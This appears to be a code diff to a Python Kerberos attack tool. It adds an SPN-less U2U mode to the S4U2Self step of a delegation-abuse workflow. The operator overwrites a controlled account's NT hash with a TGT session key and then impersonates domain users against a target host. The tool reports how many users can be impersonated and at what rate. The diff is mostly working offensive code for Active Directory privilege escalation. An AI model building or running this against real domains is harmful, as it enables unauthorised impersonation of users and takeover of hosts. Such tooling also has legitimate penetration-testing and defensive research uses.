@@ -98,7 +98,8 @@ def die(msg):
 # ---------------------------------------------------------------------------#
 class Ctx:
     __slots__ = ("tgt", "cipher", "session_key", "domain", "machine_account",
-                 "spn", "kdc", "target", "target_ip", "port", "timeout", "debug")
+                 "spn", "kdc", "target", "target_ip", "port", "timeout", "debug",
+                 "u2u")
 
 
 # ---------------------------------------------------------------------------#
@@ -161,11 +162,19 @@ def do_s4u(impersonate, ctx):
     tgsReq["padata"][1]["padata-value"] = encoder.encode(pfu)
 
     body = seq_set(tgsReq, "req-body")
-    body["kdc-options"] = constants.encodeFlags([
+    self_opts = [
         constants.KDCOptions.forwardable.value,
         constants.KDCOptions.renewable.value,
         constants.KDCOptions.canonicalize.value,
-    ])
+    ]
+    if ctx.u2u:
+        # SPN-less controlled account: ask for the S4U2Self ticket encrypted in
+        # our own TGT session key (enc-tkt-in-skey), with the TGT as additional
+        # ticket. The operator must have set the account's NT hash to that same
+        # session key beforehand, so the KDC can decrypt it again at S4U2Proxy.
+        self_opts.append(constants.KDCOptions.renewable_ok.value)
+        self_opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
+    body["kdc-options"] = constants.encodeFlags(self_opts)
     seq_set(body, "sname",
             Principal(ctx.machine_account,
                       type=constants.PrincipalNameType.NT_UNKNOWN.value).components_to_asn1)
@@ -174,6 +183,10 @@ def do_s4u(impersonate, ctx):
     body["nonce"] = random.getrandbits(31)
     seq_set_iter(body, "etype",
                  (int(ctx.cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))
+    if ctx.u2u:
+        tgt_ticket = Ticket()
+        tgt_ticket.from_asn1(decodedTGT["ticket"])
+        seq_set_iter(body, "additional-tickets", (tgt_ticket.to_asn1(TicketAsn1()),))
 
     try:
         r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
@@ -500,6 +513,11 @@ def main():
                            "if the ccache holds no usable TGT.")
     auth.add_argument("-aesKey", metavar="hex key", default="",
                       help="AES key to use for Kerberos authentication (128 or 256 bits).")
+    auth.add_argument("-u2u", "-spnless", dest="u2u", action="store_true",
+                      help="SPN-less controlled account: do S4U2Self as U2U "
+                           "(enc-tkt-in-skey). Requires a ccache TGT (-k) whose session "
+                           "key you already wrote as the account's NT hash. See the "
+                           "SPN-less section of the README.")
 
     conn = p.add_argument_group("connection")
     conn.add_argument("-dc-ip", dest="dc_ip", default=None,
@@ -532,8 +550,12 @@ def main():
         raise
     except Exception as e:                        # noqa: BLE001
         die(f"Could not get a TGT: {e}")
+    if args.u2u and not method.startswith("ccache"):
+        die("-u2u needs the TGT from your ccache (-k -no-pass): the S4U2Self ticket "
+            "is sealed with that TGT's session key, which you set as the account's NT "
+            "hash. A freshly requested TGT would have a different key and fail.")
     kv("account", f"{username}@{domain}", C.BOLD)
-    kv("method", method)
+    kv("method", method + ("  + U2U (SPN-less)" if args.u2u else ""))
     kv("KDC", args.dc_host or args.dc_ip or f"{domain.lower()} (DNS)")
     kv("TGT", "OK", C.GREEN)
 
@@ -550,6 +572,7 @@ def main():
     ctx.port = args.port
     ctx.timeout = args.timeout
     ctx.debug = args.debug
+    ctx.u2u = args.u2u
 
     section("Target")
     kv("host", f"{fqdn} ({target_ip}:{args.port})", C.BOLD)
@@ -646,8 +669,11 @@ def main():
           "not delegatable, disabled, locked out or expired")
     tally("unknown", len(nouser), C.DIM, "no such principal in the realm")
     tally("errors", len(errors), C.RED, "unexpected failures")
-    print(f"  {C.DIM}{processed:>6}  checked   "
-          f"out of {len(users)} in {time.monotonic() - started:.1f}s{C.RESET}")
+    elapsed = time.monotonic() - started
+    rate = processed / elapsed if elapsed else 0
+    print(f"  {C.CYAN}{C.BOLD}{processed:>6}  checked   "
+          f"out of {len(users)} in {elapsed:.1f}s{C.RESET}"
+          f"  {C.CYAN}({rate:.0f} users/s){C.RESET}")
 
     for label, rows, colour in (("no ticket", noticket, C.YELLOW),
                                 ("errors", errors, C.RED)):
